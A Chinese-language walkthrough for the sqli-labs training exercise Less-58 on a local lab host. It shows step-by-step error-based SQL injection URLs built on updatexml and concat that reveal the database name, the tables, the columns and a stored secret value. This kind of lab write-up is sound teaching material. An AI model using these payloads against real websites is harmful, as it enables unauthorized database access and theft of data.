---
title: Less - 58
date: 2023-03-24T19:25:48Z
lastmod: 2023-03-24T19:37:29Z
---

# Less - 58

---

# 通关教程

---

## 1、判断闭合

---

```http
http://192.168.23.128/sqli-labs/Less-58/?id=1'
```

​![image](assets/image-20230324192755-146ip1e.png)​

根据错误显示判断闭合方式为'--+，并且为字符型注入，因为这里有完整的报错信息，所以可以使用报错注入攻击

---

## 2、查看当前库

---

```http
http://192.168.23.128/sqli-labs/Less-58/?id=1' and updatexml(1,concat(0x7e,(database()),0x7e),1)--+
```

​![image](assets/image-20230324192949-y0uuzhw.png)​

---

## 3、查看challenges库下的所有表

---

```http
http://192.168.23.128/sqli-labs/Less-58/?id=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='challenges'),0x7e),1)--+
```

​![image](assets/image-20230324193123-adjr0r4.png)​

---

## 4、查看0jphobw9pw表下的所有字段

---

```http
http://192.168.23.128/sqli-labs/Less-58/?id=1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='0jphobw9pw'),0x7e),1)--+
```

​![image](assets/image-20230324193540-zxqx3jp.png)​

---

## 5、查看secret_H4GR字段下的值

---

```http
http://192.168.23.128/sqli-labs/Less-58/?id=1' and updatexml(1,concat(0x7e,(select group_concat(secret_H4GR) from challenges.0jphobw9pw),0x7e),1)--+
```

​![image](assets/image-20230324193704-86v8wg9.png)​

​![image](assets/image-20230324193727-ywh2e7b.png)​

‍
